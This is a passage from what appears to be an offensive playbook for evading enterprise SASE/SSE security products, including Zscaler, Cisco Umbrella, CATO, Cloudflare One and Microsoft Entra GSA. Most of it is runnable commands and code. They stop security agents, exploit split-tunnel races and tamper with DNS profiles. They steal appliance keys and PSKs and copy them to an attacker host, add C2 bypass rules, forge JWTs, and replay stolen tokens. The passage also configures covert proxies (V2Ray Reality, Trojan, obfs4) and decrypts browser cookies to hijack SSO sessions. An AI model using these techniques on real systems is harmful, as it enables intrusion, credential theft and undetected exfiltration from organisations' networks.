# Some SWGs inspect HTTP/2 (over TLS 1.2/1.3) but not HTTP/3 (over QUIC/UDP).
# Force the client to use HTTP/3 where supported.

# curl with HTTP/3
curl --http3 -o /dev/null -w '%{http_code}\n' https://www.cloudflare.com/

# Chrome: enable HTTP/3
# chrome://flags/#enable-quic = Enabled

# If the SWG doesn't inspect UDP/443 (QUIC), HTTP/3 flows bypass inspection.
# Verify with Wireshark: QUIC traffic should not show in the SWG's logs.
sudo tshark -i en0 -Y 'quic' -T fields -e ip.dst -e udp.dstport 2>/dev/null | sort -u
```

### 5.7 TLS 1.3 with Session Resumption (Defeats Some SWGs)

```bash
# Some SWGs cannot inspect TLS 1.3 with session resumption (PSK mode).
# The PSK is established in a prior handshake; resumption skips the key exchange.

# Force TLS 1.3 with session resumption
curl --tls-max 1.3 --tlsv1.3 -k -o /dev/null -w '%{http_code}\n' https://target.example.com/

# Note: Most modern SWGs (Zscaler, Netskope, 2024+) handle TLS 1.3 with resumption.
# Test your specific deployment.
```

### 5.8 Custom Protocol over TLS (Re-encrypt Inside the inspected Flow)

```bash
# Wrap the actual payload in another TLS layer inside the SSE-inspected TLS.
# The SSE decrypts the outer TLS, sees "HTTPS to a trusted destination",
# and re-encrypts to the destination. The destination terminates the inner TLS.

# Example: Shadowsocks over TLS to a "trusted" SaaS
#   Client → [inner TLS: shadowsocks-encrypted payload]
#          → [outer TLS: SSE sees "HTTPS to updates.ubuntu.com"]
#          → SSE decrypts outer, re-encrypts, forwards to ubuntu.com
#   But ubuntu.com is not the destination — the inner TLS goes to a CDN-fronted
#   shadowsocks backend.

# This requires the SSE to not deep-inspect the payload after decryption.
# Test with a known-CDN-fronted backend (authorized lab).
```

---

## 6. Split-Tunnel Race Conditions

Zscaler, Palo Alto GlobalProtect, and Cisco AnyConnect all support split-tunneling. A process can win the classification race during agent startup.

### 6.1 Zscaler ZIA-FWD-ZPA Race (macOS)

```bash
# Stop the agent daemon
sudo launchctl unload /Library/LaunchDaemons/com.zscaler.agentdaemon.plist

# Immediately open a long-lived connection to the target
nohup curl --keepalive-time 60 --retry 100 --retry-delay 1 \
  -o /dev/null https://blocked.example.com &

# Restart the agent daemon
sleep 1
sudo launchctl load /Library/LaunchDaemons/com.zscaler.agentdaemon.plist

# Check if the curl process is still receiving data
ps -p $! && echo "[+] process alive — bypass may be in effect"

# Verify with tcpdump (the bypass flows direct, not through utun)
sudo tcpdump -i en0 -w bypass.pcap host blocked.example.com and port 443 &
sleep 10
sudo killall tcpdump
# If packets in bypass.pcap do NOT have utun encapsulation, bypass confirmed.
```

### 6.2 LD_PRELOAD Hook on connect() (Linux)

```bash
# On Linux, hook the libc connect() call to bind the socket before the agent classifies.

cat > /tmp/hook_connect.c << 'EOF'
#define _GNU_SOURCE
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    static int (*real_connect)(int, const struct sockaddr *, socklen_t) = NULL;
    if (!real_connect) real_connect = dlsym(RTLD_NEXT, "connect");

    // Force the connection during the agent's startup race window
    // (additional logic to detect / wait for the window goes here)
    fprintf(stderr, "[hook] connect() called\n");
    return real_connect(sockfd, addr, addrlen);
}
EOF

gcc -shared -fPIC -o /tmp/hook_connect.so /tmp/hook_connect.c -ldl

# Use the hook with curl
LD_PRELOAD=/tmp/hook_connect.so curl https://blocked.example.com
```

### 6.3 Palo Alto GlobalProtect Split-Tunnel Race

```bash
# Stop the GlobalProtect agent (requires local admin)
sudo launchctl unload /Library/LaunchDaemons/com.paloaltonetworks.gp.pangps.plist
sudo launchctl unload /Library/LaunchDaemons/com.paloaltonetworks.gp.pangpa.plist

# Open the connection
nohup curl --keepalive-time 60 -o /dev/null https://internal.example.com &

# Restart the agent
sleep 1
sudo launchctl load /Library/LaunchDaemons/com.paloaltonetworks.gp.pangps.plist

# Note: GlobalProtect's WFP filter on Windows is sticky and survives service restart.
# The race window is shorter than Zscaler's. Test repeatedly.
```

### 6.4 Cisco Secure Client (Umbrella + AnyConnect) Split-Tunnel Race

```bash
# Stop the Cisco Secure Client services
sudo launchctl unload /Library/LaunchDaemons/com.cisco.anyconnect.vpnagentd.plist 2>/dev/null
sudo launchctl unload /Library/LaunchDaemons/com.cisco.umbrella.roamingclient.plist 2>/dev/null

# Open the connection
nohup curl -o /dev/null https://blocked.example.com &

# Restart
sleep 1
sudo launchctl load /Library/LaunchDaemons/com.cisco.anyconnect.vpnagentd.plist 2>/dev/null
```

### 6.5 BYOD App-Specific Routing Bypass (Cross-Vendor)

```bash
# On BYOD, the agent classifies apps by binary hash / signature / path.
# Apps not in the classification list go direct.

# Identify apps that bypass (run each app, observe if its traffic flows via the SSE)
for app in /Applications/*.app; do
  name=$(basename "$app" .app)
  echo "Testing: $name"
  # Open the app, make a test request, observe via tcpdump whether the SSE
  # cloud IP appears in the destination
done

# Common apps that may bypass classification:
#   - Unsigned / self-built binaries (python scripts, Go binaries)
#   - Apps installed outside /Applications (e.g., /opt/homebrew/bin)
#   - CLI tools (curl, wget) — many agents focus on signed GUI apps

# Demonstrate with a Go binary
cat > /tmp/test.go << 'EOF'
package main
import ("fmt"; "net/http"; "io")
func main() {
    r, _ := http.Get("https://blocked.example.com")
    b, _ := io.ReadAll(r.Body)
    fmt.Println(string(b[:100]))
}
EOF
go run /tmp/test.go
# If the Go binary's traffic goes direct (not via the SSE cloud IP), bypass confirmed.
```

---

## 7. Cisco Umbrella Roaming Client Bypass

Cisco Umbrella enforces DNS-based policy via a roaming client that redirects queries to Umbrella resolvers. Bypasses target the DNS layer.

### 7.1 Roaming Client Process Identification

```bash
# macOS
ps -axo pid,comm | grep -iE 'umbrella|opendns|cisco.secure.client'

# Common process names:
#   org.cisco.umbrella.roamingclient.helper
#   Cisco Secure Client (umbrella module)
#   OpenDNS Roaming Client

# Windows
Get-Service | Where-Object { $_.Name -match 'Umbrella|OpenDNS|CiscoSecureClient' }

# Daemon paths
ls -la /Library/LaunchDaemons/ | grep -iE 'cisco|umbrella|opendns'
```

### 7.2 DoH Bypass

```bash
# Configure DoH to bypass Umbrella's enforced DNS
# Firefox:
#   network.trr.uri = https://dns.google/dns-query
#   network.trr.mode = 3

# Verify DNS bypass
dig +trace @8.8.8.8 blocked.example.com
# If the trace succeeds and the domain resolves, Umbrella's DNS policy is bypassed.

# Use a non-standard DoH endpoint (Umbrella may block the well-known ones)
# Self-hosted DoH (authorized lab):
#   doh-server (https://github.com/m13253/doh-server)
#   Run on port 8443 with a valid cert
curl -H 'accept: application/dns-json' \
  'https://doh.example.com:8443/dns-query?name=blocked.example.com&type=A'
```

### 7.3 SmartProxy Block-Page Bypass

```bash
# When Umbrella blocks a domain, it returns a block page (HTML).
# If the block is enforced at DNS only (not SNI inspection), direct IP works.

# 1. Resolve the real IP via DoH
REAL_IP=$(curl -s -H 'accept: application/dns-json' \
  'https://dns.google/resolve?name=blocked.example.com&type=A' \
  | jq -r '.Answer[0].data')
echo "Real IP: $REAL_IP"

# 2. Connect directly to the IP, skipping DNS
curl --resolve blocked.example.com:443:$REAL_IP https://blocked.example.com/

# 3. If the connection succeeds, SmartProxy is DNS-only enforcement.
```

### 7.4 Roaming Client Stop (Persistence Prep)

```bash
# macOS
sudo launchctl unload /Library/LaunchDaemons/org.cisco.umbrella.roamingclient.helper.plist 2>/dev/null
sudo launchctl unload /Library/LaunchDaemons/com.cisco.umbrella.roamingclient.plist 2>/dev/null

# Windows (PowerShell as admin)
Stop-Service "CiscoAMPTelemetry" -Force 2>$null
Stop-Service "Cisco Secure Client - AnyConnect" -Force 2>$null
Stop-Service "OpenDNS Roaming Client" -Force 2>$null

# Note: On managed devices, MDM (Intune / Jamf) will redeploy within minutes.
```

### 7.5 SIG (Secure Internet Gateway) Profile Tampering

```bash
# The roaming client reads its profile from a local file
sudo cat "/Library/Application Support/OpenDNS Roaming Client/profiles/default.profile" 2>/dev/null

# The profile contains:
#   - Org info (organization ID, fingerprint)
#   - Policy version
#   - Resolver IPs

# Modify the resolver IPs to a non-Umbrella resolver (DoH or 8.8.8.8)
# Requires write access (root); on BYOD, may be writable.

# Demonstrate the modification
sudo bash -c 'cat > "/Library/Application Support/OpenDNS Roaming Client/profiles/default.profile" << EOF
{
  "org_id": "REPLACE_WITH_YOUR_ORG_ID",
  "resolvers": ["8.8.8.8", "8.8.4.4"],
  "policy_version": "0"
}
EOF'

# Restart the roaming client
sudo launchctl load /Library/LaunchDaemons/com.cisco.umbrella.roamingclient.plist
```

---

## 8. CATO Networks SASE Socket Takeover

CATO Networks' SASE Socket is a hardware/virtual appliance deployed at branch sites. The socket establishes an isolated tunnel to the CATO cloud.

### 8.1 Socket Identification

```bash
# CATO Socket is typically a Linux appliance
ssh admin@<socket-ip>  # default IP often 169.254.0.1 or via DHCP

# Inside the socket:
cat /etc/cato/cato_socket.conf
cat /var/cato/config.json

# Common config fields:
#   account_id
#   socket_id (unique per socket)
#   licensing_token
#   tunnel_pre_shared_key
```

### 8.2 Socket Tunnel Credential Extraction

```bash
# Inside the socket (root access required)
sudo cat /etc/cato/tunnel_psk
sudo cat /etc/cato/socket_cert.pem
sudo cat /etc/cato/socket_key.pem

# The PSK and cert authenticate the socket to the CATO cloud.
# Replay from another socket to masquerade as this socket.

# Copy to attacker-controlled host:
scp admin@<socket-ip>:/etc/cato/tunnel_psk ./stolen_psk
scp admin@<socket-ip>:/etc/cato/socket_cert.pem ./stolen_cert.pem
scp admin@<socket-ip>:/etc/cato/socket_key.pem ./stolen_key.pem
```

### 8.3 Socket Replay (Authorized Lab)

```bash
# Deploy a virtual CATO socket in the lab
# Configure it with the stolen PSK + cert

# Modify the socket config:
sudo tee /etc/cato/cato_socket.conf > /dev/null << EOF
{
  "account_id": "REPLACE_WITH_YOUR_ACCOUNT_ID",
  "socket_id": "REPLACE_WITH_STOLEN_SOCKET_ID",
  "tunnel_pre_shared_key": "$(cat stolen_psk)",
  "socket_cert_path": "/etc/cato/stolen_cert.pem",
  "socket_key_path": "/etc/cato/stolen_key.pem"
}
EOF

# Restart the cato-socket service
sudo systemctl restart cato-socket

# Verify the socket connected to CATO cloud as the stolen socket
sudo journalctl -u cato-socket -n 20 | grep -i 'connected\|authenticated'
```

### 8.4 Isolated-Traffic Tunneling Abuse

```bash
# The CATO socket supports "isolated traffic" — flows that bypass the policy
# (e.g., for testing, for management).

# Inspect the isolation rules:
sudo cat /etc/cato/isolation_rules.json 2>/dev/null

# Add a new isolation rule that allows the attacker's C2 traffic
sudo bash -c 'cat > /etc/cato/isolation_rules.json << EOF
[
  {
    "name": "management-bypass",
    "src_ip": "10.0.0.0/8",
    "dst_ip": "REPLACE_WITH_YOUR_C2_IP",
    "dst_port": 443,
    "action": "isolate"
  }
]
EOF'

sudo systemctl restart cato-socket
```

---

## 9. Cloudflare One / Zero Trust Bypass

Cloudflare One combines WARP (client agent), Gateway (SWG), Access (ZTNA), and Tunnel (inbound connector).

### 9.1 WARP Client Identification

```bash
# macOS
ps -axo pid,comm | grep -iE 'warp|cloudflare'
sudo launchctl list | grep -i cloudflare

# Daemon paths
ls -la /Library/LaunchDaemons/ | grep -iE 'cloudflare|warp'
ls -la /Library/LaunchAgents/ | grep -iE 'cloudflare|warp'

# Config files
sudo cat "/Library/Application Support/Cloudflare/mdm-deploy.json" 2>/dev/null
defaults read com.cloudflare.warp 2>/dev/null
```

### 9.2 WARP Client Bypass (Stop Agent)

```bash
# macOS
sudo launchctl unload /Library/LaunchDaemons/com.cloudflare.warp.daemon.plist

# Windows (PowerShell as admin)
Stop-Service "Cloudflare WARP" -Force

# Linux
sudo systemctl stop warp-svc

# Verify egress is no longer Cloudflare
curl -s https://ifconfig.me/json | jq .org
```

### 9.3 Cloudflare Gateway Bypass via DoH

```bash
# Gateway classifies by domain; DoH to an outside resolver bypasses domain policy
# Firefox:
#   network.trr.uri = https://dns.google/dns-query
#   network.trr.mode = 3

# Verify Gateway is bypassed
dig +trace @8.8.8.8 blocked.example.com
curl https://blocked.example.com/
```

### 9.4 Cloudflare Access SSO Bypass (Stolen Service Token)

```bash
# Cloudflare Access uses service tokens (CF-Access-Client-Id + CF-Access-Client-Secret)
# for service-to-service authentication. Stolen tokens grant access to Access-protected apps.

# Test a stolen service token
CF_ACCESS_CLIENT_ID='REPLACE_WITH_YOUR_CLIENT_ID'
CF_ACCESS_CLIENT_SECRET='REPLACE_WITH_YOUR_CLIENT_SECRET'
APP_DOMAIN='protected.example.com'

curl -s -H "CF-Access-Client-Id: $CF_ACCESS_CLIENT_ID" \
     -H "CF-Access-Client-Secret: $CF_ACCESS_CLIENT_SECRET" \
     "https://$APP_DOMAIN/" | head

# A successful response confirms the stolen token grants access.
```

### 9.5 Cloudflare Tunnel Manipulation

```bash
# Cloudflare Tunnel (cloudflared) exposes internal services to the Cloudflare edge.
# The tunnel uses a tunnel token (UUID) and connector cert.

# Locate the tunnel config (on a host running cloudflared)
sudo cat /etc/cloudflared/config.yml 2>/dev/null
sudo cat /root/.cloudflared/config.yml 2>/dev/null
sudo cat ~/.cloudflared/config.yml 2>/dev/null

# Sample config:
#   tunnel: <tunnel-uuid>
#   credentials-file: /root/.cloudflared/<tunnel-uuid>.json
#   ingress:
#     - hostname: app1.example.com
#       service: http://localhost:8080
#     - service: http_status:404

# Extract the tunnel credentials file
sudo cat /root/.cloudflared/<tunnel-uuid>.json
# Contains:
#   {
#     "AccountTag": "...",
#     "TunnelID": "...",
#     "TunnelSecret": "...",
#     "TunnelName": "..."
#   }

# Replay the credentials on an attacker-controlled host (authorized lab)
# Install cloudflared, configure with the stolen credentials, route ingress to attacker-controlled services
```

### 9.6 Cloudflare Access JWT Forgery (Authorized Lab)

```bash
# Cloudflare Access issues a JWT after authentication. The JWT is signed by the
# team's public key. To forge, you need the private key (compromise the Access CA).

# In an authorized lab with the Access private key (extracted from the team zone):
# 1. Locate the team's Access private key (in the dash.cloudflare.com UI, under Access > Certificates)
# 2. Forge a JWT signed with the private key, claiming to be a target user

# JWT payload (forged):
cat > /tmp/forged-jwt-payload.json << 'EOF'
{
  "iss": "https://<team>.cloudflareaccess.com",
  "sub": "victim@corp.com",
  "aud": ["<app-aud-tag>"],
  "exp": $(($(date +%s) + 3600)),
  "iat": $(date +%s),
  "email": "victim@corp.com",
  "name": "Victim User"
}
EOF

# Sign with the team's private key (RSA or ECDSA; depends on team config)
openssl dgst -sha256 -sign /tmp/team-private-key.pem /tmp/forged-jwt-payload.json \
  | base64 -w0 > /tmp/forged-signature.b64

# Construct the JWT: base64url(payload).base64url(signature)
# Use the JWT against an Access-protected app
curl -s -H "CF-Access-Jwt-Assertion: $FORGED_JWT" \
  "https://protected.example.com/"
```

---

## 10. Microsoft Entra Global Secure Access Bypass

Microsoft Entra Global Secure Access (GSA) is Microsoft's SSE — combines Private Access (ZTNA) and Internet Access (SWG) under a single Windows/macOS client. The client trusts the Entra ID PRT.

### 10.1 GSA Client Identification

```bash
# Windows
Get-Service | Where-Object { $_.Name -match 'GSA\|GlobalSecureAccess' }
Get-Process | Where-Object { $_.ProcessName -match 'GlobalSecureAccess\|GSA' }

# Daemon paths
Get-ChildItem "$env:PROGRAMFILES\Microsoft\Entra\Global Secure Access Client" -ErrorAction SilentlyContinue

# macOS
ls /Applications/ | grep -i "Global Secure Access"
ps -axo pid,comm | grep -i gsa
```

### 10.2 GSA Traffic Forwarding Profile Manipulation

```powershell
# The GSA client installs a Windows Filtering Platform (WFP) filter
# that routes "Internet Access" and "Private Access" traffic through Microsoft's SSE cloud.

# Inspect the WFP filters
netsh wfp show state file=gsa_wfp.txt
# Open gsa_wfp.txt and search for filters with providerName matching Microsoft Entra

# Disable the GSA traffic filter (requires admin; the Advanced Endpoint Management service may re-enable)
# This is destructive to the GSA trust model; authorized lab only

# Stop the GSA service
Stop-Service -Name "GSAService" -Force
```

### 10.3 GSA Client Bypass via Stolen PRT

```bash
# The GSA client trusts the Entra ID Primary Refresh Token (PRT).
# A stolen PRT (cross-ref cloud-identity-attack) grants access through GSA from another device.

# Extract the PRT from a compromised Windows device
# (See cloud-identity-attack payloads.md for full PRT extraction)

# Replay the PRT through GSA
# 1. On a non-managed Windows device, install the GSA client
# 2. Inject the stolen PRT into the device's Entra ID join state
# 3. The GSA client treats the device as joined + user-authenticated
# 4. Traffic forwarding kicks in via Microsoft's SSE cloud

# This is the Storm-0558 pattern (2023): stolen Entra ID token replayed
# through Microsoft services including GSA.
```

### 10.4 GSA Profile API Enumeration

```bash
# The GSA admin API is part of Microsoft Graph
ACCESS_TOKEN='REPLACE_WITH_YOUR_ENTRA_ACCESS_TOKEN'

# List traffic forwarding profiles
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/beta/networkAccess/forwardingProfiles" | jq .

# List private access apps (ZTNA)
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/beta/networkAccess/filteringPolicies" | jq .

# A compromised Entra ID token (Storm-0558 pattern) grants access to enumerate
# and potentially modify the GSA configuration.
```

### 10.5 GSA Mac Client Bypass

```bash
# macOS GSA client
# Stop the agent
sudo launchctl unload /Library/LaunchDaemons/com.microsoft.gsa.daemon.plist

# The macOS GSA client uses a NetworkExtension filter
# Verify it's unloaded
ifconfig | grep -E 'utun'  # the GSA-managed utun should be gone

# Test direct egress
curl -s https://ifconfig.me/json | jq .org
```

---

## 11. Anonymizer Proxy Evasion

Anonymizer proxies present a TLS profile the SWG cannot classify as proxy evasion. Used in authorized lab to demonstrate exfiltration.

### 11.1 Shadowsocks (socks5 over TLS-ish)

```bash
# Server (residential IP VPS)
pip install shadowsocks
# Or use shadowsocks-rust
cargo install shadowsocks-rust

# Server config: /etc/shadowsocks/server.json
cat > /etc/shadowsocks/server.json << 'EOF'
{
  "server": "0.0.0.0",
  "server_port": 8388,
  "password": "REPLACE_WITH_YOUR_PASSWORD",
  "method": "aes-256-gcm",
  "timeout": 300
}
EOF

# Start server
ssserver -c /etc/shadowsocks/server.json -d start

# Client (on the SSE-protected endpoint)
cat > /tmp/shadowsocks-client.json << 'EOF'
{
  "server": "REPLACE_WITH_YOUR_RESIDENTIAL_IP",
  "server_port": 8388,
  "password": "REPLACE_WITH_YOUR_PASSWORD",
  "method": "aes-256-gcm",
  "local_address": "127.0.0.1",
  "local_port": 1080,
  "timeout": 300
}
EOF

sslocal -c /tmp/shadowsocks-client.json &

# Use the local socks proxy
curl --socks5 127.0.0.1:1080 https://ifconfig.me

# Note: Shadowsocks' TLS profile is distinctive. The SWG may classify by the
# specific handshake. Use shadowsocks over WebSocket + TLS (v2ray-plugin) for
# better evasion.
```

### 11.2 V2Ray (vmess + WebSocket + TLS)

```bash
# Server (residential IP VPS with valid TLS cert)
# Install Xray-core
bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install

# Server config: /usr/local/etc/xray/config.json
cat > /usr/local/etc/xray/config.json << 'EOF'
{
  "log": {"loglevel": "warning"},
  "inbounds": [{
    "port": 443,
    "protocol": "vmess",
    "settings": {
      "clients": [{"id": "REPLACE_WITH_YOUR_UUID", "alterId": 0}]
    },
    "streamSettings": {
      "network": "ws",
      "security": "tls",
      "tlsSettings": {
        "certificates": [{
          "certificateFile": "/etc/letsencrypt/live/REPLACE_WITH_YOUR_DOMAIN/fullchain.pem",
          "keyFile": "/etc/letsencrypt/live/REPLACE_WITH_YOUR_DOMAIN/privkey.pem"
        }]
      },
      "wsSettings": {"path": "/REPLACE_WITH_YOUR_PATH"}
    }
  }],
  "outbounds": [{"protocol": "freedom"}]
}
EOF

systemctl restart xray

# Generate a UUID for the client config
UUID=$(xray uuid)
echo "Client UUID: $UUID"

# Client config (on the SSE-protected endpoint)
cat > /tmp/v2ray-client.json << 'EOF'
{
  "log": {"loglevel": "warning"},
  "inbounds": [{
    "port": 1080,
    "listen": "127.0.0.1",
    "protocol": "socks",
    "settings": {"udp": true}
  }],
  "outbounds": [{
    "protocol": "vmess",
    "settings": {
      "vnext": [{
        "address": "REPLACE_WITH_YOUR_DOMAIN",
        "port": 443,
        "users": [{"id": "REPLACE_WITH_YOUR_UUID", "alterId": 0}]
      }]
    },
    "streamSettings": {
      "network": "ws",
      "security": "tls",
      "tlsSettings": {"serverName": "REPLACE_WITH_YOUR_DOMAIN"},
      "wsSettings": {"path": "/REPLACE_WITH_YOUR_PATH"}
    }
  }]
}
EOF

xray run -c /tmp/v2ray-client.json &

# Use the local socks proxy
curl --socks5 127.0.0.1:1080 https://ifconfig.me

# The SWG sees: TLS to REPLACE_WITH_YOUR_DOMAIN, with a legitimate cert chain.
# Traffic is indistinguishable from legitimate HTTPS to that domain.
```

### 11.3 V2Ray with VLESS + Reality (More Advanced)

```bash
# VLESS + Reality steals the TLS handshake of a real website (e.g., microsoft.com)
# This makes the flow look like legitimate HTTPS to microsoft.com from the SWG's view.

# Server config (Xray ≥ 1.8.x required):
cat > /usr/local/etc/xray/config.json << 'EOF'
{
  "inbounds": [{
    "port": 443,
    "protocol": "vless",
    "settings": {
      "clients": [{"id": "REPLACE_WITH_YOUR_UUID", "flow": "xtls-rprx-vision"}],
      "decryption": "none"
    },
    "streamSettings": {
      "network": "tcp",
      "security": "reality",
      "realitySettings": {
        "show": false,
        "dest": "www.microsoft.com:443",
        "xver": 0,
        "serverNames": ["www.microsoft.com"],
        "privateKey": "REPLACE_WITH_YOUR_REALITY_PRIVATE_KEY",
        "shortIds": ["REPLACE_WITH_YOUR_SHORT_ID"]
      }
    }
  }],
  "outbounds": [{"protocol": "freedom"}]
}
EOF

systemctl restart xray

# Client config:
cat > /tmp/v2ray-reality-client.json << 'EOF'
{
  "inbounds": [{"port": 1080, "listen": "127.0.0.1", "protocol": "socks"}],
  "outbounds": [{
    "protocol": "vless",
    "settings": {
      "vnext": [{
        "address": "REPLACE_WITH_YOUR_RESIDENTIAL_IP",
        "port": 443,
        "users": [{"id": "REPLACE_WITH_YOUR_UUID", "flow": "xtls-rprx-vision", "encryption": "none"}]
      }]
    },
    "streamSettings": {
      "network": "tcp",
      "security": "reality",
      "realitySettings": {
        "serverName": "www.microsoft.com",
        "fingerprint": "chrome",
        "publicKey": "REPLACE_WITH_YOUR_REALITY_PUBLIC_KEY",
        "shortId": "REPLACE_WITH_YOUR_SHORT_ID",
        "spiderX": "/"
      }
    }
  }]
}
EOF

xray run -c /tmp/v2ray-reality-client.json &

# Use the proxy
curl --socks5 127.0.0.1:1080 https://ifconfig.me

# The SWG sees: TLS handshake to REPLACE_WITH_YOUR_RESIDENTIAL_IP that exactly
# mimics a Chrome client connecting to www.microsoft.com. The "real" microsoft.com
# cert is presented transparently via Reality. Evasion is very strong.
```

### 11.4 Obfs4 (Tor Bridge with Obfuscation)

```bash
# Install Tor with obfs4 pluggable transport
brew install tor obfs4proxy  # macOS
# Or apt install tor obfs4proxy on Linux

# Configure Tor to use a known obfs4 bridge
cat >> /opt/homebrew/etc/tor/torrc << 'EOF'
UseBridges 1
Bridge obfs4 IP:PORT CERTIFICATE KEY
ClientTransportPlugin obfs4 exec /opt/homebrew/bin/obfs4proxy
EOF

brew services start tor

# Use the Tor socks proxy
curl --socks5 127.0.0.1:9050 https://ifconfig.me

# Note: Many SASE vendors block known Tor exit nodes; obfs4 bridges are
# specifically designed to be unblockable from a traffic-analysis perspective.
# The SWG sees: an obfs4 flow to a residential IP — looks like random bytes,
# not recognizable as Tor.
```

### 11.5 Trojan (HTTPS-Look Proxy with Real Website Frontend)

```bash
# Install trojan-go or trojan
# Server side: configure trojan to share port 443 with nginx

# nginx config: serves a real website on port 80
cat > /etc/nginx/sites-available/trojan-frontend << 'EOF'
server {
  listen 80 default_server;
  root /var/www/html;
  index index.html;
  server_name REPLACE_WITH_YOUR_DOMAIN;
}
EOF
ln -s /etc/nginx/sites-available/trojan-frontend /etc/nginx/sites-enabled/
nginx -t && systemctl reload nginx

# Trojan server config: /etc/trojan/config.json
cat > /etc/trojan/config.json << 'EOF'
{
  "run_type": "server",
  "local_addr": "0.0.0.0",
  "local_port": 443,
  "remote_addr": "127.0.0.1",
  "remote_port": 80,
  "password": ["REPLACE_WITH_YOUR_PASSWORD"],
  "log": {"access": "/var/log/trojan/access.log", "error": "/var/log/trojan/error.log"},
  "ssl": {
    "cert": "/etc/letsencrypt/live/REPLACE_WITH_YOUR_DOMAIN/fullchain.pem",
    "key": "/etc/letsencrypt/live/REPLACE_WITH_YOUR_DOMAIN/privkey.pem",
    "sni": "REPLACE_WITH_YOUR_DOMAIN"
  }
}
EOF

systemctl restart trojan

# Trojan client config (on the SSE-protected endpoint)
cat > /tmp/trojan-client.json << 'EOF'
{
  "run_type": "client",
  "local_addr": "127.0.0.1",
  "local_port": 1080,
  "remote_addr": "REPLACE_WITH_YOUR_DOMAIN",
  "remote_port": 443,
  "password": ["REPLACE_WITH_YOUR_PASSWORD"],
  "ssl": {"sni": "REPLACE_WITH_YOUR_DOMAIN"}
}
EOF

trojan -config /tmp/trojan-client.json &

# Use the local socks proxy
curl --socks5 127.0.0.1:1080 https://ifconfig.me

# When the SWG probes REPLACE_WITH_YOUR_DOMAIN, it gets a real nginx website.
# The TLS profile is nginx's. The SWG has no way to distinguish Trojan from a normal HTTPS site.
```

### 11.6 CDN Fronting for Trojan / V2Ray

```bash
# Place Trojan / V2Ray behind a CDN (Cloudflare, Fastly, AWS CloudFront)
# The SWG sees traffic to *.cloudflareresources.com / *.cloudfront.net — common CDN domains.

# 1. Configure the CDN to proxy REPLACE_WITH_YOUR_DOMAIN
# 2. Trojan / V2Ray listens on the origin server
# 3. Client connects to REPLACE_WITH_YOUR_DOMAIN (resolves to CDN)
# 4. CDN forwards to origin (Trojan / V2Ray)
# 5. SWG cannot block the CDN without blocking legitimate CDN traffic

# Client config (Trojan example, using CDN domain):
cat > /tmp/trojan-cdn-client.json << 'EOF'
{
  "run_type": "client",
  "local_addr": "127.0.0.1",
  "local_port": 1080,
  "remote_addr": "cdn-fronted-domain.com",
  "remote_port": 443,
  "password": ["REPLACE_WITH_YOUR_PASSWORD"],
  "ssl": {"sni": "cdn-fronted-domain.com"}
}
EOF
```

### 11.7 Comparison of Anonymizer Approaches

| Anonymizer | TLS Profile | SWG Detectability | Notes |
|------------|-------------|-------------------|-------|
| Shadowsocks (raw) | Distinctive | HIGH — known fingerprint | Use only in lab |
| Shadowsocks + v2ray-plugin (WS+TLS) | Like nginx | MEDIUM | Add real cert + domain |
| V2Ray vmess + WS + TLS | Like nginx | LOW | Good for residential |
| V2Ray vless + Reality | Steals real site's TLS | VERY LOW | Best-in-class evasion |
| Obfs4 | Random bytes | LOW | Tor network blocked but obfs4 not |
| Trojan | Like nginx | VERY LOW | Real website on probe |
| Trojan + CDN | CDN TLS | EXTREMELY LOW | CDN-fronted |

---

## 12. Stolen SSO Token Replay Through SSE

The SSE cloud trusts the IdP (Entra ID, Okta, AD FS). A stolen IdP token (OAuth, SAML, cookie) grants SSE access from any device.

### 12.1 Steal the SSO Cookie from a Compromised Browser

```bash
# macOS Safari cookies
sudo cp ~/Library/Cookies/Cookies.binarycookies /tmp/safari-cookies.binarycookies
# Parse with a tool like binarycooks or dump with Python:
python3 << 'EOF'
import struct, sys
with open('/tmp/safari-cookies.binarycookies', 'rb') as f:
    data = f.read()
# Parse the binarycookies format (header, pages, cookies)
# Output: domain, path, name, value, expiry
EOF

# macOS Chrome cookies (encrypted with Keychain)
sudo cp ~/Library/Application\ Support/Google/Chrome/Default/Cookies /tmp/chrome-cookies.db
sqlite3 /tmp/chrome-cookies.db "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%.microsoftonline.com' OR host_key LIKE '%.okta.com';"
# The encrypted_value is AES-CBC encrypted with a key in macOS Keychain.

# Decrypt Chrome cookies (requires the Chrome Safe Storage key from Keychain)
KEY=$(security find-generic-password -w -s "Chrome Safe Storage" -a "Chrome")
python3 << EOF
import sqlite3, hashlib, base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
key = hashlib.pbkdf2_hmac('sha1', b'$KEY', b'saltysalt', 1003, 16)
# Decrypt each cookie value...
EOF

# Windows (Chrome)
copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies" "%TEMP%\chrome-cookies.db"
# Decrypt with DPAPI (the AES key is wrapped by DPAPI)
```

### 12.2 Replay the Stolen SSO Cookie through the SSE Cloud

```bash
# The SSO cookie (e.g., ESTSAUTH for Entra ID, sid for Okta) is the IdP identity.
# When replayed through the SSE cloud, the SSE treats the request as authenticated.

# Example: replay Entra ID session cookie to Zscaler ZIA (which trusts Entra ID SSO)
ESTSAUTH='REPLACE_WITH_YOUR_STOLEN_ESTSAUTH'
ZIA_CLOUD='REPLACE_WITH_YOUR_ZIA_CLOUD'
ZIA_USERNAME='REPLACE_WITH_YOUR_USERNAME'

# The Zscaler Ticket acquisition flow:
# 1. User is redirected to login.microsoftonline.com
# 2. User authenticates (the ESTSAUTH cookie satisfies this)
# 3. Microsoft redirects back to Zscaler with a SAML assertion
# 4. Zscaler issues a Zscaler Ticket
# 5. Zscaler Ticket is exchanged for a jsessionid

# Replay (simulate the flow):
curl -s -b "ESTSAUTH=$ESTSAUTH" -L \
  "https://$ZIA_CLOUD/?username=$ZIA_USERNAME" \
  -c /tmp/zscaler-cookies.txt -o /tmp/zscaler-response.html

# Extract the Zscaler Ticket from the response
grep -oP 'ticket=\K[^"&]+' /tmp/zscaler-response.html

# Use the ticket for subsequent ZIA API calls (as in §3.3)
```

### 12.3 Replay the Stolen SSO Cookie through Microsoft GSA

```bash
